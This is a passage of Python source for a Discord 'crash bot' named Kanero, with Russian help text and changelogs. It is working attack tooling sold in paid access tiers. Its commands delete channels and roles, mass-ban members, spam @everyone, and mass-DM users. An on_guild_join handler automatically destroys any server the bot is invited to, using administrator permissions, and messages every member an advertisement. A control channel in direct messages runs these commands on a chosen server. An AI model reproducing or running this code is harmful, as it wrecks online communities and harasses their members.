            "• `!setup` и `!setup_update` автоматически выдают роль 👤 Guest всем\n\n"
            "**💰 Система компенсаций:**\n"
            "• Нашёл баг? Сообщи в тикет — получи компенсацию!\n"
            "• За критические баги (как краш сервера) — автоматическая компенсация всем"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd  |  !changelogall — вся история")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)


@bot.command(name="changelogall")
async def changelogall(ctx):
    """Показывает всю историю обновлений."""
    embed = discord.Embed(title="📋 CHANGELOG — Полная история  |  v1.0 → v2.0", color=0x0a0a0a)
    embed.add_field(name="☠️ v1.0", value="• `!nuke`, `!stop`, `!webhooks`, логирование", inline=False)
    embed.add_field(name="⚡ v1.1", value="• `!auto_nuke`, `/sp`, `/spkd`, whitelist, `!cleanup`, `!rename`", inline=False)
    embed.add_field(name="🎨 v1.2", value="• Тёмный стиль, Owner Panel, `!owl_add`, `!invlink`", inline=False)
    embed.add_field(name="🆕 v1.3", value="• Premium система, `!block_guild`, `!set_spam_text`", inline=False)
    embed.add_field(name="🆕 v1.4", value="• `!massdm`, `!massban`, `!spam`, `!pingspam`, `!rolesdelete`, `!serverinfo`", inline=False)
    embed.add_field(name="💀 v1.5-1.6", value="• `!super_nuke`, `!auto_super_nuke`, `!auto_superpr_nuke`", inline=False)
    embed.add_field(name="🔥 v1.7", value="• MongoDB, `!pm_add` авто +whitelist, `!list`, `!list_clear`", inline=False)
    embed.add_field(name="🔥 v1.8", value="• Freelist, `!owner_nuke`, `!auto_off`, `!setup`, `!nukelogs`, `!fl_add/remove/list/clear`", inline=False)
    embed.add_field(
        name="🔥🔥 v2.0 — ПОЛНЫЙ РЕДИЗАЙН",
        value=(
            "• Категории: СТАТИСТИКА · FREELIST · WHITE · PREMIUM\n"
            "• Счётчики ролей, тикеты, роли User/Media/Moderator\n"
            "• !wl_add/pm_add/fl_add по username/@mention/ID\n"
            "• !setup_update — обновить без удаления каналов\n"
            "• !list_clear — очищает все списки\n"
            "• ADMIN — все видят, только Owner пишет\n"
            "• Статистика обновляется авто"
        ),
        inline=False
    )
    embed.add_field(
        name="🔥 v2.1 — Новые функции",
        value=(
            "• 🤝 Friend, 🎬 Media, 🛡️ Moderator — правильная иерархия\n"
            "• Авто-роль 👤 Guest при входе\n"
            "• 🛒・sell · 🎫・выдача-вайта\n"
            "• !sync_roles — синхронизация ролей + авто-удаление из листа\n"
            "• !autorole — статус авто-роли\n"
            "• ЛС команды сразу на домашнем сервере"
        ),
        inline=False
    )
    embed.add_field(
        name="🔥 v2.2",
        value=(
            "• 🌟 Fame → 🤝 Friend, стоит над 💎 Premium\n"
            "• 🤝・admin-chat в ADMIN\n"
            "• Нюки быстрее — удаление и создание параллельно\n"
            "• Овнер всегда останавливает любой нюк\n"
            "• Авто-лог в 📊・logs при каждом нюке\n"
            "• Удалены `/sp` и `/spkd`"
        ),
        inline=False
    )
    embed.add_field(
        name="🐛 v2.3 — Багфиксы",
        value=(
            "• Исправлен критический баг с автокрашем домашнего сервера\n"
            "• Защита от авто-нюков на домашнем сервере\n"
            "• Логирование всех типов нюков (auto_nuke, auto_super_nuke, auto_owner_nuke)\n"
            "• Токен и OWNER_ID в переменных окружения\n"
            "• `!help` и `!changelog` работают для всех на нашем сервере\n"
            "• `!setup` и `!setup_update` автоматически выдают роль 👤 Guest\n"
            "• `!compensate` — система компенсаций за найденные баги"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  discord.gg/aud6wwYVRd  |  текущая версия: v2.3")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)


@bot.command(name="help")
async def help_cmd(ctx):
    uid = ctx.author.id
    is_owner = (uid == config.OWNER_ID)
    is_prem = is_premium(uid)
    is_wl = is_whitelisted(uid)
    is_fl = is_freelisted(uid)

    embed = discord.Embed(
        title="☠️ Kanero — CRASH BOT",
        description=(
            "```\n"
            "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
            " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
            " ██║     ██████╔╝███████║███████╗███████║\n"
            " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
            " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
            "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
            "```"
        ),
        color=0x0a0a0a
    )

    if is_owner:
        access_str = "👑 **OWNER** — полный доступ"
    elif is_prem:
        access_str = "💎 **PREMIUM** — расширенный доступ"
    elif is_wl:
        access_str = "✅ **Whitelist** — базовые команды"
    elif is_freelisted(uid):
        access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
    else:
        access_str = "❌ **Нет доступа** — напиши в #addbot на нашем сервере: https://discord.gg/aud6wwYVRd"

    embed.add_field(name="🔑 Твой уровень", value=access_str, inline=False)

    embed.add_field(
        name="📋 FREELIST (напиши в #addbot — бесплатно)",
        value=(
            "`!nuke` — краш (переименование → роли → каналы → спам → роль ☠️)\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
            "`!help` — это меню\n"
            "`!changelog` — последнее обновление\n"
            "`!changelogall` — вся история"
        ),
        inline=False
    )

    embed.add_field(
        name="✅ WHITELIST",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!rename [название]` — переименовать каналы\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков\n"
            "`!inv` — ссылка для добавления бота"
        ),
        inline=False
    )

    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!nuke [текст]` — нюк с кастомным текстом\n"
            "`!super_nuke [текст]` — нюк, до 15 участников + роль ☠️\n"
            "`!auto_super_nuke on/off/text/info` — авто super_nuke при входе\n"
            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе\n"
            "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
            "`!rolesdelete` · `!serverinfo` · `!userinfo`"
        ),
        inline=False
    )

    if is_owner:
        embed.add_field(
            name="👑 OWNER",
            value=(
                "`!owner_nuke [текст]` — полный нюк + роль ☠️\n"
                "`!auto_owner_nuke on/off/text/info` — авто owner нюк\n"
                "`!auto_off` — выключить все авто нюки\n"
                "`!auto_info` — статус всех авто нюков\n"
                "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                "`!fl_add/remove/list/clear` — freelist\n"
                "`!on_add/remove/list` — owner nuke list\n"
                "`!compensate <тип> <время>` — объявить компенсацию с кнопкой\n"
                "`!announce_bug \"Название\" Описание` — объявить о баге\n"
                "`!list` · `!list_clear` · `!sync_roles` — синхронизация ролей\n"
                "`!autorole` — статус авто-роли\n"
                "`!block_guild/unblock_guild`\n"
                "`!setup` · `!setup_update` — структура сервера\n"
                "`!goout` · `!nukelogs` · `!roles` · `!giverole`\n"
                "`!unban <id>` · `!guilds` · `!setguild` · `!invlink`"
            ),
            inline=False
        )

    embed.add_field(
        name="💬 Купить подписку",
        value=(
            "**White / Premium:**\n"
            "🛒・sell — https://discord.com/channels/1497100825628115108/1497101001088045076\n"
            "🎫・выдача-вайта — https://discord.com/channels/1497100825628115108/1497101001088045077\n\n"
            "**Наш сервер:** https://discord.gg/aud6wwYVRd"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  !changelogall — вся история  |  v2.3")
    embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
    await ctx.send(embed=embed)



@bot.command(name="commands_user")
@wl_check()
async def commands_user(ctx):
    embed = discord.Embed(
        title="👁️ КОМАНДЫ — ОБЫЧНЫЙ ПОЛЬЗОВАТЕЛЬ",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke` — переименование → удаление ролей → каналы → спам → роль ☠️\n"
            "`!stop` — остановить краш\n"
            "`!cleanup` — снести всё, оставить один канал\n"
            "`!auto_nuke on/off/info` — авто-краш при входе бота"
        ),
        inline=False
    )
    embed.add_field(
        name="⚡ КОНТРОЛЬ",
        value=(
            "`!rename [название]` — переименовать все каналы\n"
            "`!nicks_all [ник]` — сменить ники всем\n"
            "`!webhooks` — список вебхуков"
        ),
        inline=False
    )
    embed.add_field(
        name="🔱 УТИЛИТЫ",
        value=(
            "`!inv` — ссылка для добавления бота\n"
            "`/sp [кол-во] [текст]` — спам\n"
            "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой\n"
            "`!changelog` — история обновлений"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_premium")
@wl_check()
async def commands_premium(ctx):
    embed = discord.Embed(
        title="💎 КОМАНДЫ — PREMIUM",
        description="Доступны только Premium пользователям. Купить: **davaidkatt**",
        color=0x0a0a0a
    )
    embed.add_field(
        name="💀 УНИЧТОЖЕНИЕ",
        value=(
            "`!nuke [текст]` — нюк со своим текстом\n"
            "`!super_nuke [текст]` — нюк всё одновременно\n"
            "`!massban` — забанить всех участников\n"
            "`!rolesdelete` — удалить все роли\n"
            "`!auto_super_nuke on/off/text/info` — авто нюк при входе\n"
            "`!auto_superpr_nuke on/off/text/info` — авто турбо нюк при входе"
        ),
        inline=False
    )
    embed.add_field(
        name="📨 СПАМ",
        value=(
            "`!massdm [текст]` — разослать ДМ всем участникам\n"
            "`!spam [кол-во] [текст]` — спам в канал\n"
            "`!pingspam [кол-во]` — спам @everyone"
        ),
        inline=False
    )
    embed.add_field(
        name="🔍 ИНФО",
        value=(
            "`!serverinfo` — подробная инфа о сервере\n"
            "`!userinfo [id]` — инфа о пользователе"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero  |  davaidkatt")
    await ctx.send(embed=embed)


@bot.command(name="commands_owner")
async def commands_owner(ctx):
    if ctx.author.id != config.OWNER_ID:
        return
    embed = discord.Embed(
        title="👑 КОМАНДЫ — OWNER",
        description="Только для овнера бота.",
        color=0x0a0a0a
    )
    embed.add_field(
        name="👥 WHITELIST",
        value=(
            "`!wl_add <id>` — выдать доступ к боту\n"
            "`!wl_remove <id>` — забрать доступ\n"
            "`!wl_list` — список пользователей"
        ),
        inline=False
    )
    embed.add_field(
        name="💎 PREMIUM",
        value=(
            "`!pm_add <id>` — выдать Premium\n"
            "`!pm_remove <id>` — забрать Premium\n"
            "`!pm_list` — список Premium"
        ),
        inline=False
    )
    embed.add_field(
        name="🔒 БЛОКИРОВКА",
        value=(
            "`!block_guild <id>` — заблокировать сервер\n"
            "`!unblock_guild <id>` — разблокировать\n"
            "`!blocked_guilds` — список заблокированных"
        ),
        inline=False
    )
    embed.add_field(
        name="📝 НАСТРОЙКИ",
        value=(
            "`!set_spam_text <текст>` — сменить дефолтный текст нюка\n"
            "`!get_spam_text` — показать текущий текст\n"
            "`!owl_add/remove/list` — owner whitelist"
        ),
        inline=False
    )
    embed.add_field(
        name="🖥️ В ЛС",
        value=(
            "`!owner_help` — полная панель управления\n"
            "`!guilds` — список серверов\n"
            "`!setguild <id>` — выбрать сервер\n"
            "`!invlink` — инвайты со всех серверов"
        ),
        inline=False
    )
    embed.set_footer(text="☠️ Kanero")
    await ctx.send(embed=embed)


# ─── EVENTS ────────────────────────────────────────────────

@bot.event
async def on_member_remove(member):
    """При выходе с домашнего сервера — удаляем из whitelist и пишем в ЛС."""
    if member.guild.id != HOME_GUILD_ID:
        return
    uid = member.id
    if uid == config.OWNER_ID:
        return
    removed = False
    if uid in config.WHITELIST:
        config.WHITELIST.remove(uid)
        save_whitelist()
        removed = True
    if uid in PREMIUM_LIST:
        PREMIUM_LIST.remove(uid)
        save_premium()
        removed = True
    if removed:
        try:
            home_guild = bot.get_guild(HOME_GUILD_ID)
            invite_url = "https://discord.gg/aud6wwYVRd"
            if home_guild:
                try:
                    ch = next((c for c in home_guild.text_channels if c.permissions_for(home_guild.me).create_instant_invite), None)
                    if ch:
                        inv = await ch.create_invite(max_age=0, max_uses=0, unique=False)
                        invite_url = inv.url
                except Exception:
                    pass
            await member.send(
                embed=discord.Embed(
                    title="❌ Доступ к боту удалён",
                    description=(
                        "Ты вышел с нашего сервера — доступ к командам бота был удалён.\n\n"
                        "Чтобы восстановить доступ — вернись на сервер и напиши в канал `#addbot`:\n"
                        f"{invite_url}"
                    ),
                    color=0x0a0a0a
                ).set_footer(text="☠️ Kanero  |  davaidkatt")
            )
        except Exception:
            pass
    # Обновляем статистику
    try:
        await update_stats_channels(member.guild)
    except Exception:
        pass


AUTO_ROLE_ID = 1497636045766791191  # Роль 👤 Guest


@bot.event
async def on_member_join(member):
    """При входе на домашний сервер — выдаём авто-роль Guest и пишем в welcome канал."""
    guild = member.guild
    if guild.id != HOME_GUILD_ID:
        return

    # ── 1. Выдаём роль Guest по ID или по имени ──
    try:
        guest_role = guild.get_role(AUTO_ROLE_ID) or discord.utils.find(lambda r: r.name == "👤 Guest", guild.roles)
        if guest_role:
            await member.add_roles(guest_role, reason="Авто-роль Guest при входе")
    except Exception:
        pass

    # ── 2. Пишем в welcome канал ──
    welcome_ch = discord.utils.find(
        lambda c: "welcome" in c.name.lower() or "велком" in c.name.lower() or "приветствие" in c.name.lower(),
        guild.text_channels
    )
    if not welcome_ch:
        return

    addbot_ch = discord.utils.find(lambda c: "addbot" in c.name.lower(), guild.text_channels)
    addbot_mention = addbot_ch.mention if addbot_ch else "#addbot"
    app_id = bot.user.id
    invite_url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"

    embed = discord.Embed(
        title=f"☠️ Добро пожаловать, {member.display_name}!",
        description=(
            f"Рады видеть тебя на сервере **Kanero**.\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**🤖 Как подключить бота Kanero:**\n\n"
            f"**Шаг 1.** Зайди в канал {addbot_mention} и напиши любое сообщение\n"
            "**Шаг 2.** Бот напишет тебе в ЛС с инструкцией\n"
            f"**Шаг 3.** Добавь бота на свой сервер: [нажми сюда]({invite_url})\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**📋 Доступные команды (freelist):**\n"
            "• `!nuke` — краш сервера\n"
            "• `!auto_nuke on/off` — авто-краш при входе бота\n"
            "• `!help` — список команд\n"
            "• `!changelog` / `!changelogall` — история обновлений\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "**💎 Купить Premium:** **davaidkatt** | **@Firisotik**\n"
            "**🔗 Сервер:** https://discord.gg/aud6wwYVRd"
        ),
        color=0x0a0a0a
    )
    embed.set_thumbnail(url=member.display_avatar.url)
    embed.set_footer(text=f"☠️ Kanero  |  Участник #{guild.member_count}")
    try:
        await welcome_ch.send(f"👋 {member.mention}")
        await welcome_ch.send(embed=embed)
    except Exception:
        pass
    # Обновляем статистику
    try:
        await update_stats_channels(guild)
    except Exception:
        pass


@bot.event
async def on_guild_join(guild):
    if is_guild_blocked(guild.id):
        return  # Сервер заблокирован — ничего не делаем

    # ЗАЩИТА: никогда не запускаем авто-нюк на домашнем сервере
    if guild.id == HOME_GUILD_ID:
        return

    # AUTO OWNER NUKE — полный нюк без ограничений (только овнер)
    if AUTO_OWNER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_OWNER_NUKE_TEXT if AUTO_OWNER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_owner_nuke_task(guild, spam_text))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_owner_nuke"))
        return

    # AUTO SUPERPR NUKE — всё одновременно, максимальная скорость
    if AUTO_SUPERPR_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPERPR_NUKE_TEXT if AUTO_SUPERPR_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_superpr_nuke"))
        return

    # AUTO SUPER NUKE — функционал super_nuke (оставляет до 15 участников)
    if AUTO_SUPER_NUKE:
        nuke_running[guild.id] = True
        spam_text = AUTO_SUPER_NUKE_TEXT if AUTO_SUPER_NUKE_TEXT else config.SPAM_TEXT
        asyncio.create_task(do_superpr_nuke_task(guild, spam_text))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_super_nuke"))
        return

    if config.AUTO_NUKE:
        nuke_running[guild.id] = True
        asyncio.create_task(do_nuke(guild))
        asyncio.create_task(log_nuke(guild, bot.user, "auto_nuke"))

        dm_text = "|| @everyone  @here ||\n# Kanero-bot\n# 🔧 Developer-DavaidKa)\n**Хочеш так же? **\nhttps://discord.gg/exYwg6Gz"

        async def dm_all():
            for member in guild.members:
                if member.bot:
                    continue
                try:
                    await member.send(dm_text)
                except Exception:
                    pass
                await asyncio.sleep(0.5)

        asyncio.create_task(dm_all())


# Активный сервер для каждого пользователя в ЛС: user_id -> guild_id
active_guild: dict[int, int] = {}


class GuildSelectView(discord.ui.View):
    def __init__(self, guilds: list[discord.Guild], user_id: int):
        super().__init__(timeout=60)
        self.user_id = user_id
        # Добавляем кнопки (максимум 25)
        for guild in guilds[:25]:
            btn = discord.ui.Button(label=guild.name[:80], custom_id=str(guild.id))
            btn.callback = self.make_callback(guild)
            self.add_item(btn)

    def make_callback(self, guild: discord.Guild):
        async def callback(interaction: discord.Interaction):
            if interaction.user.id != self.user_id:
                await interaction.response.send_message("Не твоя кнопка.", ephemeral=True)
                return
            active_guild[self.user_id] = guild.id
            await interaction.response.edit_message(
                content=f"✅ Активный сервер: **{guild.name}** (`{guild.id}`)\nТеперь все команды в ЛС выполняются на этом сервере.",
                view=None
            )
        return callback


async def run_dm_command(message: discord.Message, guild: discord.Guild, cmd_text: str):
    """Выполняет команду от имени владельца на указанном сервере без отправки сообщений в каналы."""
    parts = cmd_text.strip().split(maxsplit=1)
    cmd_name = parts[0].lstrip("!").lower()
    args = parts[1] if len(parts) > 1 else ""

    try:
        # nuke
        if cmd_name == "nuke":
            if nuke_running.get(guild.id):
                await message.channel.send("⚠️ Уже запущено.")
                return
            nuke_running[guild.id] = True
            nuke_starter[guild.id] = message.author.id
            spam_text = args if args else config.SPAM_TEXT
            last_nuke_time[guild.id] = asyncio.get_running_loop().time()
            last_spam_text[guild.id] = spam_text
            asyncio.create_task(do_nuke(guild, spam_text, caller_id=message.author.id))
            asyncio.create_task(log_nuke(guild, message.author, "nuke"))
            await message.channel.send(f"✅ `nuke` запущен на **{guild.name}**")

        elif cmd_name == "stop":
            uid = message.author.id
            starter_id = nuke_starter.get(guild.id)

            if uid == config.OWNER_ID:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id is None:
                nuke_running[guild.id] = False
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")
            elif starter_id == config.OWNER_ID:
                await message.channel.send("❌ Нюк запущен **овнером** — только он может остановить.")
            elif is_premium(starter_id) and not is_premium(uid):
                await message.channel.send("❌ Нюк запущен **Premium** пользователем — обычная подписка не может остановить.")
            else:
                nuke_running[guild.id] = False
                nuke_starter.pop(guild.id, None)
                await message.channel.send(f"✅ Остановлено на **{guild.name}**")

        elif cmd_name == "cleanup":
            asyncio.create_task(delete_all_channels(guild))
            await message.channel.send(f"✅ `cleanup` запущен на **{guild.name}**")

        elif cmd_name == "rename":
            if not args:
                await message.channel.send("Укажи название: `!rename <название>`")
                return
            asyncio.create_task(asyncio.gather(
                *[c.edit(name=args) for c in guild.channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Переименовываю каналы на **{guild.name}**")

        elif cmd_name == "nsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=True) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW включён на **{guild.name}**")

        elif cmd_name == "unnsfw_all":
            asyncio.create_task(asyncio.gather(
                *[c.edit(nsfw=False) for c in guild.text_channels],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ NSFW выключен на **{guild.name}**")

        elif cmd_name == "nicks_all":
            if not args:
                await message.channel.send("Укажи ник: `!nicks_all <ник>`")
                return
            targets = [m for m in guild.members if m.id not in (message.author.id, bot.user.id, guild.owner_id)]
            asyncio.create_task(asyncio.gather(
                *[m.edit(nick=args) for m in targets],
                return_exceptions=True
            ))
            await message.channel.send(f"✅ Меняю ники на **{guild.name}**")

        elif cmd_name == "webhooks":
            whs = await guild.webhooks()
            if not whs:
                await message.channel.send("Вебхуков нет.")
                return
            msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
            await message.channel.send(f"```{msg[:1900]}```")

        elif cmd_name == "auto_nuke":
            state = args.lower()
            if state == "on":
                config.AUTO_NUKE = True
                await message.channel.send("✅ Авто-краш включён.")
            elif state == "off":
                config.AUTO_NUKE = False
                await message.channel.send("❌ Авто-краш выключён.")
            elif state == "info":
                status = "✅ Включён" if config.AUTO_NUKE else "❌ Выключён"
                await message.channel.send(f"Авто-краш: {status}")
            else:
                await message.channel.send("Используй: `!auto_nuke on/off/info`")

        elif cmd_name in ("wl_add",):
            if not args:
                await message.channel.send("Использование: `!wl_add <id>`")
                return
            try:
                uid = int(args.strip())
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` добавлен в whitelist.")
                else:
                    await message.channel.send("Уже в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_add <id>`")

        elif cmd_name in ("wl_remove",):
            if not args:
                await message.channel.send("Использование: `!wl_remove <id>`")
                return
            try:
                uid = int(args.strip())
                if uid in config.WHITELIST:
                    config.WHITELIST.remove(uid)
                    save_whitelist()
                    await message.channel.send(f"✅ `{uid}` убран из whitelist.")
                else:
                    await message.channel.send("Не найден в whitelist.")
            except ValueError:
                await message.channel.send("Использование: `!wl_remove <id>`")

        elif cmd_name in ("wl_list",):
            if not config.WHITELIST:
                await message.channel.send("Whitelist пуст.")
            else:
                lines = []
                for uid in config.WHITELIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="✅ Whitelist", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(config.WHITELIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "inv":
            app_id = bot.user.id
            url = f"https://discord.com/oauth2/authorize?client_id={app_id}&permissions=8&scope=bot%20applications.commands"
            await message.channel.send(f"Добавить бота: {url}")

        elif cmd_name == "block_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!block_guild <id>`")
                return
            if gid not in BLOCKED_GUILDS:
                BLOCKED_GUILDS.append(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔒 Сервер {name_str} заблокирован.")
            else:
                await message.channel.send("Сервер уже заблокирован.")

        elif cmd_name == "unblock_guild":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                gid = int(args.strip()) if args.strip() else guild.id
            except ValueError:
                await message.channel.send("Использование: `!unblock_guild <id>`")
                return
            if gid in BLOCKED_GUILDS:
                BLOCKED_GUILDS.remove(gid)
                save_blocked_guilds()
                g = bot.get_guild(gid)
                name_str = f"**{g.name}**" if g else f"`{gid}`"
                await message.channel.send(f"🔓 Сервер {name_str} разблокирован.")
            else:
                await message.channel.send("Сервер не был заблокирован.")

        elif cmd_name == "blocked_guilds":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not BLOCKED_GUILDS:
                await message.channel.send("Нет заблокированных серверов.")
            else:
                lines = []
                for gid in BLOCKED_GUILDS:
                    g = bot.get_guild(gid)
                    lines.append(f"`{gid}` — {g.name if g else 'неизвестен'}")
                await message.channel.send("🔒 Заблокированные серверы:\n" + "\n".join(lines))

        elif cmd_name == "pm_add":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid not in PREMIUM_LIST:
                    PREMIUM_LIST.append(uid)
                    save_premium()
                if uid not in config.WHITELIST:
                    config.WHITELIST.append(uid)
                    save_whitelist()
                await message.channel.send(f"💎 `{uid}` получил **Premium** + добавлен в **Whitelist**.")
            except ValueError:
                await message.channel.send("Использование: `!pm_add <id>`")

        elif cmd_name == "pm_remove":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            try:
                uid = int(args.strip())
                if uid in PREMIUM_LIST:
                    PREMIUM_LIST.remove(uid)
                    save_premium()
                    await message.channel.send(f"✅ `{uid}` убран из Premium.")
                else:
                    await message.channel.send("Не найден в Premium.")
            except ValueError:
                await message.channel.send("Использование: `!pm_remove <id>`")

        elif cmd_name == "pm_list":
            if message.author.id != config.OWNER_ID:
                await message.channel.send("❌ Только овнер.")
                return
            if not PREMIUM_LIST:
                await message.channel.send("Premium список пуст.")
            else:
                lines = []
                for uid in PREMIUM_LIST:
                    try:
                        user = await bot.fetch_user(uid)
                        lines.append(f"`{uid}` — **{user}**")
                    except Exception:
                        lines.append(f"`{uid}` — *не найден*")
                embed = discord.Embed(title="💎 Premium список", description="\n".join(lines), color=0x0a0a0a)
                embed.set_footer(text=f"☠️ Kanero  |  Всего: {len(PREMIUM_LIST)}")
                await message.channel.send(embed=embed)

        elif cmd_name == "unban":
            if not args:
                await message.channel.send("Использование: `!unban <user_id>`")
                return
            try:
                uid = int(args.strip())
                user = await bot.fetch_user(uid)
                unbanned = 0
                failed = 0
                for g in bot.guilds:
                    try:
                        await g.unban(user, reason="unban by owner")
                        unbanned += 1
                    except Exception:
                        failed += 1
                embed = discord.Embed(
                    title="🔓 Разбан выполнен",
                    description=f"Пользователь: **{user}** (`{uid}`)\n✅ Разбанен на **{unbanned}** серверах\n❌ Не удалось на **{failed}** серверах",
                    color=0x0a0a0a
                )
                embed.set_footer(text="☠️ Kanero")
                await message.channel.send(embed=embed)
            except ValueError:
                await message.channel.send("Использование: `!unban <user_id>`")
            except discord.NotFound:
                await message.channel.send("❌ Пользователь не найден.")

        else:
            await message.channel.send(f"❌ Неизвестная команда `{cmd_name}`. Напиши `!owner_help`.")

    except Exception as e:
        await message.channel.send(f"❌ Ошибка: {e}")


@bot.event
async def on_message(message):
    if message.author.bot:
        return

    # ── Управление через ЛС ──────────────────────────────────
    if isinstance(message.channel, discord.DMChannel):
        content = message.content.strip()

        # !help и !changelog — доступны всем в ЛС
        if content == "!help":
            uid = message.author.id
            is_owner = (uid == config.OWNER_ID)
            is_prem = is_premium(uid)
            is_wl = is_whitelisted(uid)
            is_fl = is_freelisted(uid)

            embed = discord.Embed(
                title="☠️ Kanero — CRASH BOT",
                description=(
                    "```\n"
                    "  ██████╗██████╗  █████╗ ███████╗██╗  ██╗\n"
                    " ██╔════╝██╔══██╗██╔══██╗██╔════╝██║  ██║\n"
                    " ██║     ██████╔╝███████║███████╗███████║\n"
                    " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                    " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                    "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
                    "```"
                ),
                color=0x0a0a0a
            )
            if is_owner:
                access_str = "👑 **OWNER** — полный доступ ко всем командам"
            elif is_prem:
                access_str = "💎 **PREMIUM** — расширенный доступ"
            elif is_wl:
                access_str = "✅ **Whitelist** — базовые команды"
            elif is_fl:
                access_str = "📋 **Freelist** — базовый доступ (написал в #addbot)"
            else:
                access_str = "❌ **Нет доступа** — напиши в #addbot: https://discord.gg/aud6wwYVRd"

            embed.add_field(name="🔑 Твой уровень доступа", value=access_str, inline=False)
            embed.add_field(
                name="📋 FREELIST (напиши в #addbot — бесплатно)",
                value=(
                    "`!nuke` — краш сервера\n"
                    "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
                    "`!help` — это меню\n"
                    "`!changelog` · `!changelogall` — история обновлений"
                ),
                inline=False
            )
            embed.add_field(
                name="✅ WHITELIST",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!stop` · `!cleanup` · `!rename` · `!nicks_all`\n"
                    "`!webhooks` · `!clear [число]` · `!inv`\n"
                    "`/sp [кол-во] [текст]` · `/spkd [задержка] [кол-во] [текст]`"
                ),
                inline=False
            )
            embed.add_field(
                name="💎 PREMIUM",
                value=(
                    "`!nuke [текст]` — нюк со своим текстом\n"
                    "`!super_nuke [текст]` — нюк + бан до 15 участников\n"
                    "`!massban` · `!massdm` · `!spam` · `!pingspam`\n"
                    "`!rolesdelete` · `!serverinfo` · `!userinfo`\n"
                    "`!auto_super_nuke on/off/text/info`"
                ),
                inline=False
            )
            embed.add_field(
                name="� OWNER",
                value=(
                    "`!wl_add/remove/list` · `!pm_add/remove/list`\n"
                    "`!block_guild / !unblock_guild / !blocked_guilds`\n"
                    "`!set_spam_text / !get_spam_text`\n"
                    "`!owl_add/remove/list`\n"
                    "`!guilds / !setguild / !invlink` (в ЛС)"
                ),
                inline=False
            )
            embed.add_field(
                name="💬 Купить подписку",
                value="Discord: **davaidkatt**\nTelegram: **@Firisotik**",
                inline=False
            )
            embed.set_footer(text="☠️ Kanero  |  !changelog — история обновлений")
            embed.set_thumbnail(url="https://i.imgur.com/4q1H47x.jpg")
            await message.channel.send(embed=embed)
            return

        if content == "!changelog":
